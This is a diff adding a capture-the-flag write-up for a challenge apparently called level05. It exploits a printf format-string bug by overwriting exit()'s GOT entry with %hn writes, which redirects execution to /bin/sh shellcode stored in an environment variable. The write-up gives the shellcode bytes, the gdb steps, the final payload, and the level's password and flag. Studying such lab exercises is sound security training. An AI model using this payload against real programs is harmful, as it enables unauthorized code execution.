@@ -1,0 +1,28 @@
+level05 : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+process :
+    - We got a binaire who as a printf string format
+    - With some printf input we see that we can write at the 10 offset
+        AAAA BBBB CCCC DDDD %10$x %11$x %12$x %13$x
+        aaaa bbbb cccc dddd 61616161 62626220 63632062
+    - The goal is to re write the value of exit() to redirect on a adress who got a shellcode
+    - To find the exit() adress we do 
+        objdump -R ./level05 | grep exit = 080497e0 R_386_JUMP_SLOT   exit
+        The adress of exit is = 0x080497e0
+    - The second thing to do is to store the shellcode
+        for that we will put it on the env :
+        export SHELLCODE=$(python -c 'print("\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+    - Then we want find the adress of the SHELLCODE env with gdb
+        gdb level05
+        b main
+        run
+        call (void*)getenv("SHELLCODE") : $1 = (void *) 0xffffd86e
+        The adress off SHELLCODE is 0xffffd86e
+    - after that we simply need to change the value of exit() with %n
+        We will change the 2 bytes higher and the 2 bytes lower
+        2 bytes lower : 0x080497e0  --> \xe0\x97\x04\x08 + 55448 octets (-8 octets for the 2 adress) = d86e
+        2 Bytes higher : 0x080497e2 --> \xe2\x97\x04\x08 + 10079 octets (-8 octets for the 2 adress and the octets to change the lower adress just before) = ffff
+
+    - The payload final will be : 
+        python -c 'print("\xe0\x97\x04\x08\xe2\x97\x04\x08%55448x%10$hn%10079x%11$hn")' > /tmp/level05
+    - cat /tmp/level05 - | ./level05
+    - Get the Flag : h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
